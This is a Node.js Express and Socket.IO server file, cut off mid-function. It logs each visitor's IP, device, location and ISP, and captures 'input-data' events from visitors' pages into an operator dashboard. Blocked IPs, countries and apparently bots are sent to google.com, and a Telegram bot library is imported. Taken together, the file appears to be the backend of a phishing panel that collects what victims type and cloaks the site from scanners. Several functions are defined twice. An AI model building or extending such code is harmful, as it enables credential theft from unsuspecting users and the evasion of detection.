require('dotenv').config();
const path = require("path");
const express = require("express");
const requestIp = require("request-ip");
var session = require('express-session');
const fs = require("fs");
const axios = require("axios");
const { Telegraf } = require("telegraf");
const UAParser = require("ua-parser-js");
const bot = new Telegraf(process.env.TOKEN);
const { Server } = require('socket.io');

const app = express();
const http = require('http').createServer(app);
const io = new Server(http);

// Global settings object for configuration
const globalSettings = {
  blockedIPs: new Set(), // Using Set for O(1) lookup
  inputDataBlacklist: new Set(), // IPs that have had their input data deleted
  proxyDetectionEnabled: true,
  countryFilterMode: 'block', // 'block' or 'allow'
  countryRedirectUrl: 'https://google.com',
  blockedCountries: new Set(),
  allowedCountries: new Set()
};

// Path for storing blocked IPs and input data blacklist
const BLOCKED_IPS_FILE = path.join(__dirname, 'blocked_ips.json');
const INPUT_DATA_BLACKLIST_FILE = path.join(__dirname, 'input_data_blacklist.json');

/**
 * Check if an IP address is blocked
 * @param {string} ip - The IP address to check
 * @returns {boolean} - True if the IP is blocked, false otherwise
 */
function isIPBlocked(ip) {
  // Skip blocking for local/private IPs
  if (isLocalIP(ip)) {
    return false;
  }
  return globalSettings.blockedIPs.has(ip);
}

/**
 * Check if an IP address is local/private
 * @param {string} ip - The IP address to check
 * @returns {boolean} - True if the IP is local/private, false otherwise
 */
function isLocalIP(ip) {
  return ip === '127.0.0.1' || 
         ip === 'localhost' || 
         ip === '::1' || 
         ip.startsWith('10.') || 
         ip.startsWith('192.168.') || 
         (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31);
}

/**
 * Block an IP address
 * @param {string} ip - The IP address to block
 * @returns {boolean} - True if the IP was blocked, false if it was already blocked
 */
function blockIP(ip) {
  // Skip blocking for local/private IPs
  if (isLocalIP(ip)) {
    console.log(`Cannot block local/private IP: ${ip}`);
    return false;
  }
  
  // Check if already blocked
  if (globalSettings.blockedIPs.has(ip)) {
    console.log(`IP ${ip} is already blocked`);
    return false;
  }
  
  // Add to blocked IPs set
  globalSettings.blockedIPs.add(ip);
  console.log(`IP ${ip} has been blocked`);
  
  // Save to persistent storage
  saveBlockedIPs();
  
  // Notify all dashboard clients
  io.emit('ip-blocked', { ip, timestamp: Date.now() });
  
  return true;
}

/**
 * Unblock an IP address
 * @param {string} ip - The IP address to unblock
 * @returns {boolean} - True if the IP was unblocked, false if it wasn't blocked
 */
function unblockIP(ip) {
  // Check if not blocked
  if (!globalSettings.blockedIPs.has(ip)) {
    console.log(`IP ${ip} is not blocked`);
    return false;
  }
  
  // Remove from blocked IPs set
  globalSettings.blockedIPs.delete(ip);
  console.log(`IP ${ip} has been unblocked`);
  
  // Save to persistent storage
  saveBlockedIPs();
  
  // Notify all dashboard clients
  io.emit('ip-unblocked', { ip, timestamp: Date.now() });
  
  return true;
}

/**
 * Save blocked IPs to persistent storage
 */
function saveBlockedIPs() {
  try {
    const blockedIPsArray = Array.from(globalSettings.blockedIPs);
    fs.writeFileSync(BLOCKED_IPS_FILE, JSON.stringify(blockedIPsArray, null, 2));
    console.log(`Saved ${blockedIPsArray.length} blocked IPs to ${BLOCKED_IPS_FILE}`);
  } catch (error) {
    console.error('Error saving blocked IPs:', error);
  }
}

/**
 * Load blocked IPs from persistent storage
 */
function loadBlockedIPs() {
  try {
    if (fs.existsSync(BLOCKED_IPS_FILE)) {
      const blockedIPsArray = JSON.parse(fs.readFileSync(BLOCKED_IPS_FILE, 'utf8'));
      globalSettings.blockedIPs = new Set(blockedIPsArray);
      console.log(`Loaded ${blockedIPsArray.length} blocked IPs from ${BLOCKED_IPS_FILE}`);
    } else {
      console.log(`No blocked IPs file found at ${BLOCKED_IPS_FILE}, starting with empty set`);
      globalSettings.blockedIPs = new Set();
    }
  } catch (error) {
    console.error('Error loading blocked IPs:', error);
    globalSettings.blockedIPs = new Set();
  }
}

// Load blocked IPs on startup
loadBlockedIPs();

/**
 * Convert country name to ISO country code (2-letter code)
 * @param {string} countryName - The name of the country
 * @returns {string} - The 2-letter ISO country code or null if not found
 */
function getCountryCode(countryName) {
  if (!countryName || countryName === 'Unknown') return null;
  
  // Map of common country names to their ISO codes
  const countryMap = {
    'afghanistan': 'af',
    'albania': 'al',
    'algeria': 'dz',
    'andorra': 'ad',
    'angola': 'ao',
    'argentina': 'ar',
    'armenia': 'am',
    'australia': 'au',
    'austria': 'at',
    'azerbaijan': 'az',
    'bahamas': 'bs',
    'bahrain': 'bh',
    'bangladesh': 'bd',
    'barbados': 'bb',
    'belarus': 'by',
    'belgium': 'be',
    'belize': 'bz',
    'benin': 'bj',
    'bhutan': 'bt',
    'bolivia': 'bo',
    'bosnia': 'ba',
    'bosnia and herzegovina': 'ba',
    'botswana': 'bw',
    'brazil': 'br',
    'brunei': 'bn',
    'bulgaria': 'bg',
    'burkina faso': 'bf',
    'burundi': 'bi',
    'cambodia': 'kh',
    'cameroon': 'cm',
    'canada': 'ca',
    'cape verde': 'cv',
    'central african republic': 'cf',
    'chad': 'td',
    'chile': 'cl',
    'china': 'cn',
    'colombia': 'co',
    'comoros': 'km',
    'congo': 'cg',
    'costa rica': 'cr',
    'croatia': 'hr',
    'cuba': 'cu',
    'cyprus': 'cy',
    'czech republic': 'cz',
    'denmark': 'dk',
    'djibouti': 'dj',
    'dominica': 'dm',
    'dominican republic': 'do',
    'east timor': 'tl',
    'ecuador': 'ec',
    'egypt': 'eg',
    'el salvador': 'sv',
    'equatorial guinea': 'gq',
    'eritrea': 'er',
    'estonia': 'ee',
    'ethiopia': 'et',
    'fiji': 'fj',
    'finland': 'fi',
    'france': 'fr',
    'gabon': 'ga',
    'gambia': 'gm',
    'georgia': 'ge',
    'germany': 'de',
    'ghana': 'gh',
    'greece': 'gr',
    'grenada': 'gd',
    'guatemala': 'gt',
    'guinea': 'gn',
    'guinea-bissau': 'gw',
    'guyana': 'gy',
    'haiti': 'ht',
    'honduras': 'hn',
    'hungary': 'hu',
    'iceland': 'is',
    'india': 'in',
    'indonesia': 'id',
    'iran': 'ir',
    'iraq': 'iq',
    'ireland': 'ie',
    'israel': 'il',
    'italy': 'it',
    'ivory coast': 'ci',
    'jamaica': 'jm',
    'japan': 'jp',
    'jordan': 'jo',
    'kazakhstan': 'kz',
    'kenya': 'ke',
    'kiribati': 'ki',
    'korea, north': 'kp',
    'korea, south': 'kr',
    'north korea': 'kp',
    'south korea': 'kr',
    'kosovo': 'xk',
    'kuwait': 'kw',
    'kyrgyzstan': 'kg',
    'laos': 'la',
    'latvia': 'lv',
    'lebanon': 'lb',
    'lesotho': 'ls',
    'liberia': 'lr',
    'libya': 'ly',
    'liechtenstein': 'li',
    'lithuania': 'lt',
    'luxembourg': 'lu',
    'macedonia': 'mk',
    'madagascar': 'mg',
    'malawi': 'mw',
    'malaysia': 'my',
    'maldives': 'mv',
    'mali': 'ml',
    'malta': 'mt',
    'marshall islands': 'mh',
    'mauritania': 'mr',
    'mauritius': 'mu',
    'mexico': 'mx',
    'micronesia': 'fm',
    'moldova': 'md',
    'monaco': 'mc',
    'mongolia': 'mn',
    'montenegro': 'me',
    'morocco': 'ma',
    'mozambique': 'mz',
    'myanmar': 'mm',
    'namibia': 'na',
    'nauru': 'nr',
    'nepal': 'np',
    'netherlands': 'nl',
    'new zealand': 'nz',
    'nicaragua': 'ni',
    'niger': 'ne',
    'nigeria': 'ng',
    'norway': 'no',
    'oman': 'om',
    'pakistan': 'pk',
    'palau': 'pw',
    'palestine': 'ps',
    'panama': 'pa',
    'papua new guinea': 'pg',
    'paraguay': 'py',
    'peru': 'pe',
    'philippines': 'ph',
    'poland': 'pl',
    'portugal': 'pt',
    'qatar': 'qa',
    'romania': 'ro',
    'russia': 'ru',
    'rwanda': 'rw',
    'saint kitts and nevis': 'kn',
    'saint lucia': 'lc',
    'saint vincent': 'vc',
    'samoa': 'ws',
    'san marino': 'sm',
    'sao tome and principe': 'st',
    'saudi arabia': 'sa',
    'senegal': 'sn',
    'serbia': 'rs',
    'seychelles': 'sc',
    'sierra leone': 'sl',
    'singapore': 'sg',
    'slovakia': 'sk',
    'slovenia': 'si',
    'solomon islands': 'sb',
    'somalia': 'so',
    'south africa': 'za',
    'south sudan': 'ss',
    'spain': 'es',
    'sri lanka': 'lk',
    'sudan': 'sd',
    'suriname': 'sr',
    'swaziland': 'sz',
    'sweden': 'se',
    'switzerland': 'ch',
    'syria': 'sy',
    'taiwan': 'tw',
    'tajikistan': 'tj',
    'tanzania': 'tz',
    'thailand': 'th',
    'togo': 'tg',
    'tonga': 'to',
    'trinidad and tobago': 'tt',
    'tunisia': 'tn',
    'turkey': 'tr',
    'turkmenistan': 'tm',
    'tuvalu': 'tv',
    'uganda': 'ug',
    'ukraine': 'ua',
    'united arab emirates': 'ae',
    'uae': 'ae',
    'united kingdom': 'gb',
    'uk': 'gb',
    'united states': 'us',
    'usa': 'us',
    'united states of america': 'us',
    'uruguay': 'uy',
    'uzbekistan': 'uz',
    'vanuatu': 'vu',
    'vatican city': 'va',
    'venezuela': 've',
    'vietnam': 'vn',
    'yemen': 'ye',
    'zambia': 'zm',
    'zimbabwe': 'zw'
  };
  
  // Try to find the country code
  const normalizedCountry = countryName.trim().toLowerCase();
  return countryMap[normalizedCountry] || null;
}

// Track online visitors count
let onlineVisitors = 0;

// Socket.IO connection handler
io.on('connection', (socket) => {
  console.log('New client connected:', socket.id);
  
  // Store client IP
  let clientIP = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  
  // If the client IP is localhost or ::1, use a test IP for development
  if (clientIP === '127.0.0.1' || clientIP === '::1' || clientIP === 'localhost') {
    // Check if we have a real IP from the client
    if (socket.handshake.query && socket.handshake.query.ip) {
      clientIP = socket.handshake.query.ip;
      console.log(`Using client-provided IP: ${clientIP}`);
    } else {
      // For testing, use a sample IP
      clientIP = '102.97.189.155';
      console.log(`Using test IP for localhost: ${clientIP}`);
    }
  }
  
  // Store the client IP in the socket object for easy access
  socket.clientIP = clientIP;
  
  // Check if this IP is blocked
  if (isIPBlocked(clientIP)) {
    console.log(`Blocked IP ${clientIP} attempted to connect - redirecting and disconnecting`);
    
    // Get the redirect URL (use default if not specified)
    const redirectUrl = globalSettings.countryRedirectUrl || 'https://google.com';
    
    // Send redirect event to the client
    socket.emit('redirect', { url: redirectUrl, reason: 'ip_blocked' });
    
    // Disconnect after a short delay to ensure the redirect event is sent
    setTimeout(() => {
      if (socket.connected) {
        socket.disconnect(true);
      }
    }, 500);
    
    return; // Stop further processing for this socket
  }
  
  // Update online visitors count for non-blocked IPs
  onlineVisitors++;
  io.emit('online-visitors-count', { count: onlineVisitors });
  
  // Emit proxy detection status to the new client
  socket.emit('proxy-detection-status', { enabled: globalSettings.proxyDetectionEnabled || false });
  
  // Disconnect handler
  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
    
    // Check if this socket has an accurate client IP mapping
    let clientIP = null;
    let apparentIP = null;
    
    // Find the mapping for this socket
    for (const [appIP, mapping] of accurateClientIPs.entries()) {
      if (mapping.socketId === socket.id) {
        clientIP = mapping.clientIP;
        apparentIP = appIP;
        break;
      }
    }
    
    // If we found a mapped IP, use that for disconnection
    if (clientIP) {
      console.log(`Client disconnected with mapped IP: ${clientIP}`);
      trackIPStatus(clientIP, false, socket.id);
      
      // Also clean up the mapping
      if (apparentIP) {
        accurateClientIPs.delete(apparentIP);
      }
    }
    
    // Decrement online visitors count
    onlineVisitors = Math.max(0, onlineVisitors - 1);
    io.emit('online-visitors-count', { count: onlineVisitors });
    
    // Remove this socket from the activeSocketsByIP map
    if (socket.clientIP && activeSocketsByIP.has(socket.clientIP)) {
      const activeSockets = activeSocketsByIP.get(socket.clientIP);
      activeSockets.delete(socket.id);
      
      // If no more active sockets for this IP, remove the entry
      if (activeSockets.size === 0) {
        activeSocketsByIP.delete(socket.clientIP);
      }
    }
  });
  
  // Create or update visitor metadata
  const userAgent = socket.handshake.headers['user-agent'] || '';
  const parser = new UAParser(userAgent);
  const browser = parser.getBrowser();
  const os = parser.getOS();
  const device = parser.getDevice();
  
  // Initial visitor metadata
  const initialMetadata = {
    ip: clientIP,
    browser: browser.name ? `${browser.name} ${browser.version}` : 'Unknown',
    os: os.name ? `${os.name} ${os.version}` : 'Unknown',
    device: device.vendor ? `${device.vendor} ${device.model}` : (device.type || 'Desktop'),
    lastActivity: new Date().toISOString(),
    isOnline: true,
    currentPath: socket.handshake.query.path || '/',
    referrer: socket.handshake.query.referrer || 'Direct',
    country: socket.handshake.query.country || 'Unknown',
    countryCode: socket.handshake.query.countryCode || getCountryCode(socket.handshake.query.country),
    city: socket.handshake.query.city || 'Unknown',
    org: 'Unknown',
    isp: 'Unknown',
    proxy: false
  };
  
  // Ensure we have firstSeen timestamp if this is a new visitor
  if (!visitorMetadata.has(clientIP)) {
    initialMetadata.firstSeen = new Date().toISOString();
  }
  
  // Update visitor metadata
  updateVisitorMetadata(clientIP, initialMetadata);
  
  // Log visitor metadata for debugging
  console.log(`Updated visitor metadata for IP ${clientIP}:`, visitorMetadata.get(clientIP));
  
  // Handle visitor metadata updates
  socket.on('visitor-metadata', (data) => {
    if (!data || !data.clientIP) {
      console.error('Received invalid visitor metadata:', data);
      return;
    }
    
    const ip = data.clientIP;
    console.log(`Received visitor metadata update for IP ${ip}:`, data);
    
    // Get existing metadata or create new
    const existingMetadata = visitorMetadata.get(ip) || {};
    
    // Update with new data, preserving existing fields if not provided
    const updatedMetadata = {
      ...existingMetadata,
      ip: ip,
      lastActivity: new Date().toISOString(),
      isOnline: true,
      // Update specific fields if provided
      browser: data.browser?.fullVersion || data.browser || existingMetadata.browser || 'Unknown',
      os: data.os?.fullVersion || data.os || existingMetadata.os || 'Unknown',
      device: data.device?.type || data.device || existingMetadata.device || 'Unknown',
      country: data.country || existingMetadata.country || 'Unknown',
      countryCode: data.countryCode || getCountryCode(data.country) || existingMetadata.countryCode || null,
      city: data.city || existingMetadata.city || 'Unknown',
      org: data.org || existingMetadata.org || 'Unknown',
      isp: data.isp || existingMetadata.isp || 'Unknown',
      proxy: data.proxy || existingMetadata.proxy || false,
      currentPath: data.path || data.currentPath || existingMetadata.currentPath || '/',
      referrer: data.referrer || existingMetadata.referrer || 'Direct'
    };
    
    // Ensure firstSeen is preserved or set
    if (!updatedMetadata.firstSeen) {
      updatedMetadata.firstSeen = existingMetadata.firstSeen || new Date().toISOString();
    }
    
    // Update visitor metadata
    updateVisitorMetadata(ip, updatedMetadata);
    
    // Notify all dashboard clients about the updated visitor
    io.emit('visitor-updated', { ip });
  });
  
  // Handle input data events
  socket.on('input-data', (data) => {
    // Check if this IP is in the input data blacklist
    if (global.inputDataBlacklist && global.inputDataBlacklist.has(clientIP)) {
      console.log(`Ignoring input data from blacklisted IP: ${clientIP}`);
      return; // Skip processing for blacklisted IPs
    }
    
    // Update input data cache
    updateInputDataCache(clientIP, data);
  });
  
  // Handle visitor metadata updates
  socket.on('visitor-metadata', (data) => {
    // Update visitor metadata
    updateVisitorMetadata(clientIP, data);
  });
  
  // Handle page navigation
  socket.on('page-view', (data) => {
    // Update visitor's current path
    updateVisitorMetadata(clientIP, {
      currentPath: data.path || '/',
      lastActivity: new Date().toISOString()
    });
  });
  
  // Handle disconnect
  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
    
    // Mark visitor as offline after a delay (to handle page refreshes)
    setTimeout(() => {
      const metadata = visitorMetadata.get(clientIP);
      if (metadata) {
        updateVisitorMetadata(clientIP, { isOnline: false });
      }
    }, 5000);
  });
});

// Function to update input data cache
function updateInputDataCache(clientIP, data) {
  // Check if this IP is in the input data blacklist
  if (global.inputDataBlacklist && global.inputDataBlacklist.has(clientIP)) {
    console.log(`Ignoring input data from blacklisted IP: ${clientIP}`);
    return; // Skip processing for blacklisted IPs
  }
  
  // Add timestamp if not provided
  if (!data.timestamp) {
    data.timestamp = new Date().toISOString();
  }
  
  // Get existing inputs or create new array
  let inputs = inputDataByIP.get(clientIP) || [];
  
  // Add new input at the beginning (newest first)
  inputs.unshift(data);
  
  // Limit to 50 most recent inputs
  if (inputs.length > 50) {
    inputs = inputs.slice(0, 50);
  }
  
  // Update cache
  inputDataByIP.set(clientIP, inputs);
  
  // Notify dashboard of new input data
  io.emit('input-data-update');
}

// Function to update visitor metadata
function updateVisitorMetadata(clientIP, data) {
  // Get existing metadata or create new object
  const metadata = visitorMetadata.get(clientIP) || {
    ip: clientIP,
    firstSeen: new Date().toISOString(),
    lastActivity: new Date().toISOString()
  };
  
  // Update metadata with new data
  Object.assign(metadata, data, {
    lastActivity: new Date().toISOString() // Always update last activity
  });
  
  // Update cache
  visitorMetadata.set(clientIP, metadata);
  
  // Emit dashboard update event
  io.emit('dashboard-update');
}

// Add express.json middleware to parse JSON request bodies
app.use(express.json());

// Update existing global settings with additional configuration
globalSettings.countryFilterMode = globalSettings.countryFilterMode || 'block'; // 'block' or 'allow'
globalSettings.blockedCountries = globalSettings.blockedCountries || new Set();
globalSettings.allowedCountries = globalSettings.allowedCountries || new Set();
globalSettings.countryRedirectUrl = globalSettings.countryRedirectUrl || 'https://google.com';
globalSettings.proxyDetectionEnabled = globalSettings.proxyDetectionEnabled !== undefined ? globalSettings.proxyDetectionEnabled : false;
// These are already defined in the first globalSettings declaration
// globalSettings.blockedIPs = globalSettings.blockedIPs || new Set(); // Store blocked IPs in a Set for efficient lookup
globalSettings.ipRedirectUrls = new Map(); // Key: IP, Value: { redirectUrl, reason }

// The isIPBlocked function is already defined above with more comprehensive logic
// This comment is kept to maintain code structure

/**
 * Block an IP address
 * @param {string} ip - The IP address to block
 * @param {string} [redirectUrl] - Optional custom redirect URL for this IP
 * @returns {boolean} - True if the IP was blocked, false if it was already blocked
 */
// The blockIP and unblockIP functions are already defined above with more comprehensive logic
// This comment is kept to maintain code structure

/**
 * Save blocked IPs to a file for persistence
 */
function saveBlockedIPs() {
  try {
    const blockedIPsArray = Array.from(globalSettings.blockedIPs);
    fs.writeFileSync('blocked_ips.json', JSON.stringify(blockedIPsArray, null, 2));
    console.log('Blocked IPs saved to file');
  } catch (error) {
    console.error('Error saving blocked IPs:', error);
  }
}

/**
 * Load blocked IPs from file
 */
function loadBlockedIPs() {
  try {
    if (fs.existsSync('blocked_ips.json')) {
      const data = fs.readFileSync('blocked_ips.json', 'utf8');
      const blockedIPsArray = JSON.parse(data);
      globalSettings.blockedIPs = new Set(blockedIPsArray);
      console.log(`Loaded ${globalSettings.blockedIPs.size} blocked IPs from file`);
    }
  } catch (error) {
    console.error('Error loading blocked IPs:', error);
    globalSettings.blockedIPs = new Set();
  }
}

// Load blocked IPs on startup
loadBlockedIPs();

// We'll use the Maps declared below for tracking client IPs and their status

// Map to store input data for each IP
const inputDataByIP = new Map(); // Key: IP, Value: Array of input data objects

// Map to store visitor metadata
const visitorMetadata = new Map(); // Key: IP, Value: visitor metadata object

/**
 * Update visitor metadata for a specific IP
 * @param {string} ip - The IP address
 * @param {Object} metadata - The metadata to update
 */
function updateVisitorMetadata(ip, metadata) {
  if (!ip) return;
  
  // Get existing metadata or create new
  const existingMetadata = visitorMetadata.get(ip) || {};
  
  // Merge with new metadata
  const updatedMetadata = {
    ...existingMetadata,
    ...metadata,
    // Always ensure these fields are set
    ip: ip,
    lastActivity: metadata.lastActivity || new Date().toISOString(),
    firstSeen: existingMetadata.firstSeen || metadata.firstSeen || new Date().toISOString()
  };
  
  // Update the visitor metadata map
  visitorMetadata.set(ip, updatedMetadata);
  
  // Return the updated metadata
  return updatedMetadata;
}

// Add some sample visitors for testing
function addSampleVisitors() {
  // Sample visitor 1
  visitorMetadata.set('102.97.189.155', {
    ip: '102.97.189.155',
    browser: 'Chrome 114.0.5735',
    os: 'Windows 10',
    device: 'Desktop',
    firstSeen: new Date(Date.now() - 3600000).toISOString(), // 1 hour ago
    lastActivity: new Date().toISOString(),
    isOnline: true,
    currentPath: '/QcEwP85AgNE4pnL5mWSM',
    referrer: 'Direct',
    country: 'Morocco',
    countryCode: 'ma',
    city: 'Casablanca',
    org: 'ISP Morocco',
    isp: 'Maroc Telecom',
    proxy: false
  });
  
  // Sample visitor 2
  visitorMetadata.set('45.123.45.67', {
    ip: '45.123.45.67',
    browser: 'Firefox 98.0',
    os: 'macOS 12.3',
    device: 'Desktop',
    firstSeen: new Date(Date.now() - 7200000).toISOString(), // 2 hours ago
    lastActivity: new Date(Date.now() - 1800000).toISOString(), // 30 minutes ago
    isOnline: false,
    currentPath: '/login',
    referrer: 'google.com',
    country: 'United States',
    countryCode: 'us',
    city: 'New York',
    org: 'Verizon',
    isp: 'Verizon Communications',
    proxy: false
  });
}

// Add sample visitors when server starts
addSampleVisitors();

// GET endpoint to retrieve input data for a specific IP
app.get('/dashboard/input-data/:ip', (req, res) => {
  try {
    const { ip } = req.params;
    
    // Get visitor metadata
    const visitorData = visitorMetadata.get(ip) || {
      ip: ip,
      firstSeen: new Date().toISOString(),
      lastActivity: new Date().toISOString(),
      browser: 'Unknown',
      os: 'Unknown',
      device: 'Unknown',
      country: 'Unknown',
      city: 'Unknown',
      org: 'Unknown',
      isp: 'Unknown',
      proxy: false,
      currentPath: '/',
      referrer: 'Direct'
    };
    
    // Get input data for this IP
    const inputs = inputDataByIP.get(ip) || [];
    
    // Return both metadata and inputs
    res.json({
      success: true,
      meta: visitorData,
      inputs: inputs
    });
  } catch (error) {
    console.error('Error retrieving input data:', error);
    res.status(500).json({
      success: false,
      message: 'Error retrieving input data',
      error: error.message
    });
  }
});

// GET endpoint to retrieve visitor data for a specific IP
app.get('/dashboard/visitor/:ip', (req, res) => {
  try {
    const ip = req.params.ip;
    
    // Get visitor metadata
    const visitor = visitorMetadata.get(ip) || {};
    
    // Check if this IP is in the blacklist
    const isBlacklisted = global.inputDataBlacklist && global.inputDataBlacklist.has(ip);
    
    // Check if this IP is blocked
    const isBlocked = globalSettings.blockedIPs && globalSettings.blockedIPs.has(ip);
    
    res.json({
      success: true,
      ip,
      visitor: {
        ...visitor,
        isBlacklisted,
        isBlocked
      }
    });
  } catch (error) {
    console.error(`Error retrieving visitor data for IP ${req.params.ip}:`, error);
    res.status(500).json({
      success: false,
      message: 'Error retrieving visitor data',
      error: error.message
    });
  }
});

// GET endpoint to retrieve all visitor data for the dashboard
app.get('/dashboard/visitors', (req, res) => {
  try {
    // Convert visitor metadata map to array
    const visitors = Array.from(visitorMetadata.entries()).map(([ip, data]) => {
      // Check if visitor has input data
      const hasInputData = inputDataByIP.has(ip) && inputDataByIP.get(ip).length > 0;
      
      // Get IP cache data for request count
      const ipCacheData = ipCache.get(ip) || {};
      
      return {
        ...data,
        ip: ip,
        hasInputData: hasInputData,
        inputCount: hasInputData ? inputDataByIP.get(ip).length : 0,
        requestCount: ipCacheData.requestCount || 0,
        isOnline: (new Date() - new Date(data.lastActivity)) < 5 * 60 * 1000 // Online if active in last 5 minutes
      };
    });
    
    // Return visitor data and stats
    res.json({
      success: true,
      visitors: visitors,
      stats: {
        totalVisitors: visitors.length,
        botsDetected: visitors.filter(v => v.isBot).length,
        proxyCount: visitors.filter(v => v.proxy).length,
        blockedCount: visitors.filter(v => v.blocked).length
      }
    });
  } catch (error) {
    console.error('Error retrieving visitor data:', error);
    res.status(500).json({
      success: false,
      message: 'Error retrieving visitor data',
      error: error.message
    });
  }
});

// DELETE endpoint to clear input data cache for a specific IP
app.delete('/dashboard/input-data/:ip', (req, res) => {
  const { ip } = req.params;
  
  // Check if there's data to delete
  if (!inputDataByIP.has(ip)) {
    return res.json({
      success: false,
      message: 'No input data found for this IP'
    });
  }
  
  // Delete input data for this IP
  inputDataByIP.delete(ip);
  
  // Notify dashboard clients about the update
  io.emit('input-data-update');
  
  res.json({
    success: true,
    message: `Input data cache cleared for IP ${ip}`
  });
});

const redirectURL = process.env.URL || 'https://google.com'; // Default redirect URL if not specified in .env

// Middleware to check for IP-specific redirects
app.use((req, res, next) => {
  // Skip for dashboard and API routes
  if (req.path.startsWith('/dashboard') || req.path.startsWith('/api') || req.path === '/socket.io/') {
    return next();
  }
  
  const clientIp = getAccurateClientIp(req);
  
  // Check if this IP has a redirect setting
  if (globalSettings.ipRedirectUrls.has(clientIp)) {
    const redirectSetting = globalSettings.ipRedirectUrls.get(clientIp);
    const statusCode = redirectSetting.isPermanent ? 301 : 302;
    
    console.log(`Redirecting IP ${clientIp} to ${redirectSetting.redirectUrl} (${statusCode})`);
    
    // Perform the redirect
    return res.redirect(statusCode, redirectSetting.redirectUrl);
  }
  
  next();
});

/**
 * Track IP status (online/offline) and associated socket IDs
 * @param {string} ip - The client IP address
 * @param {boolean} online - Whether the client is online
 * @param {string} socketId - The socket.io ID for this connection
 */
function trackIPStatus(ip, online, socketId) {
  if (!ip) return;
  
  // Get existing data or create new entry
  const ipData = ipCache.get(ip) || {
    online: false,
    connections: new Set(),
    lastSeen: new Date()
  };
  
  // Update status
  ipData.online = online;
  ipData.lastSeen = new Date();
  
  // Ensure connections is a Set
  if (!ipData.connections || typeof ipData.connections.add !== 'function') {
    ipData.connections = new Set();
  }
  
  // Add or remove socket ID from connections
  if (online && socketId) {
    ipData.connections.add(socketId);
  } else if (socketId && ipData.connections.has && ipData.connections.has(socketId)) {
    ipData.connections.delete(socketId);
    // If no more connections, mark as offline
    if (ipData.connections.size === 0) {
      ipData.online = false;
    }
  }
  
  // Update the cache
  ipCache.set(ip, ipData);
  
  // Log status change
  console.log(`IP ${ip} status updated: online=${ipData.online}, active connections=${ipData.connections.size}`);
}

// Socket.io connection handling
io.on('connection', (socket) => {
  // Helper function to validate if an IP is a public IP (not local/private)
  function isValidPublicIP(ip) {
    if (!ip) return false;
    
    // Check if it's a valid IP format
    const ipRegex = /^([0-9]{1,3}\.){3}[0-9]{1,3}$/;
    if (!ipRegex.test(ip)) return false;
    
    // Check if it's not a local/private IP
    const parts = ip.split('.');
    const firstOctet = parseInt(parts[0], 10);
    const secondOctet = parseInt(parts[1], 10);
    
    // Filter out local IPs
    if (ip === '127.0.0.1') return false;
    if (firstOctet === 10) return false; // 10.0.0.0/8
    if (firstOctet === 172 && secondOctet >= 16 && secondOctet <= 31) return false; // 172.16.0.0/12
    if (firstOctet === 192 && secondOctet === 168) return false; // 192.168.0.0/16
    if (firstOctet === 169 && secondOctet === 254) return false; // 169.254.0.0/16 (APIPA)
    if (ip === '0.0.0.0') return false;
    if (ip.startsWith('::1') || ip.startsWith('fe80:') || ip.startsWith('fc00:')) return false; // IPv6 local
    
    return true;
  }
  
  // Get the socket's apparent IP address
  const socketIP = socket.handshake.address || 
                  socket.handshake.headers['x-forwarded-for'] || 
                  socket.conn.remoteAddress;
  
  console.log('New client connected:', socket.id, 'Apparent IP:', socketIP);
  
  // Check if the client provided an IP in the connection query with source information
  if (socket.handshake.query && socket.handshake.query.clientIP && 
      isValidPublicIP(socket.handshake.query.clientIP)) {
    const clientIP = socket.handshake.query.clientIP;
    const source = socket.handshake.query.clientIPSource || 'socket-query';
    const isFromIpify = source.includes('ipify');
    
    console.log(`Client provided IP in connection query (source: ${source}): ${clientIP}`);
    
    // Store mapping between socket IP and accurate client IP
    accurateClientIPs.set(socketIP, {
      clientIP: clientIP,
      timestamp: new Date().toISOString(),
      source: isFromIpify ? 'ipify.org' : source,
      socketId: socket.id
    });
    
    // Update user connection status with accurate IP
    console.log(`User connected: IP=${clientIP}, SocketID=${socket.id}, Source=${isFromIpify ? 'ipify.org' : source}`);
    // Track this IP as online
    trackIPStatus(clientIP, true, socket.id);
  } else {
    // Use apparent IP temporarily until we get a more accurate one
    console.log(`User connected with apparent IP: IP=${socketIP}, SocketID=${socket.id}`);
    // We don't track the apparent IP to avoid duplicate counting
    // We'll wait for the client to send its accurate IP via client-ip event
  }

  // Handle client IP events from tracker.js
  socket.on('client-ip', (data) => {
    if (data && data.clientIP && isValidPublicIP(data.clientIP)) {
      const source = data.source || 'socket.io';
      const isFromIpify = source.includes('ipify');
      
      // Prioritize ipify.org source
      if (isFromIpify) {
        console.log(`✅ Received accurate client IP from ipify.org: ${data.clientIP}`);
      } else {
        console.log(`Received client IP from ${source}: ${data.clientIP}`);
      }
      
      // Check if we already have a connection tracked for the apparent IP
      if (ipCache.has(socketIP)) {
        // Remove the tracking for the apparent IP to avoid duplicate counting
        const apparentIPData = ipCache.get(socketIP);
        if (apparentIPData && apparentIPData.connections && apparentIPData.connections.has) {
          if (apparentIPData.connections.has(socket.id)) {
            console.log(`Removing tracking for apparent IP ${socketIP} to avoid duplicate counting`);
            trackIPStatus(socketIP, false, socket.id);
          }
        }
      }
      
      // Store mapping between socket IP and accurate client IP
      accurateClientIPs.set(socketIP, {
        clientIP: data.clientIP,
        timestamp: new Date().toISOString(),
        source: isFromIpify ? 'ipify.org' : source,
        socketId: socket.id
      });
      
      // Also update any existing visitor data
      if (ipCache.has(socketIP)) {
        const visitorData = ipCache.get(socketIP);
        visitorData.accurateIP = data.clientIP;
        visitorData.ipSource = isFromIpify ? 'ipify.org' : source;
        ipCache.set(socketIP, visitorData);
      }
      
      // Update user connection status with accurate IP
      trackIPStatus(data.clientIP, true, socket.id);
      
      // Update any existing mappings for other connections from the same client
      for (const [key, value] of accurateClientIPs.entries()) {
        if (value.clientIP === data.clientIP && key !== socketIP) {
          console.log(`Updating existing mapping for ${key} to use ipify.org source`);
          value.source = isFromIpify ? 'ipify.org' : value.source;
          accurateClientIPs.set(key, value);
        }
      }
    }
  });

  // Handle input data from clients
  socket.on('input-data', (data) => {
    if (!data || !data.clientIP) return;
    
    // Use the client IP from the data, which should be the most accurate
    const clientIP = data.clientIP;
    const source = data.source || 'unknown';
    const isFromIpify = source.includes('ipify');
    
    // Check if this IP is in the blacklist (has had its input data cache deleted)
    if (global.inputDataBlacklist && global.inputDataBlacklist.has(clientIP)) {
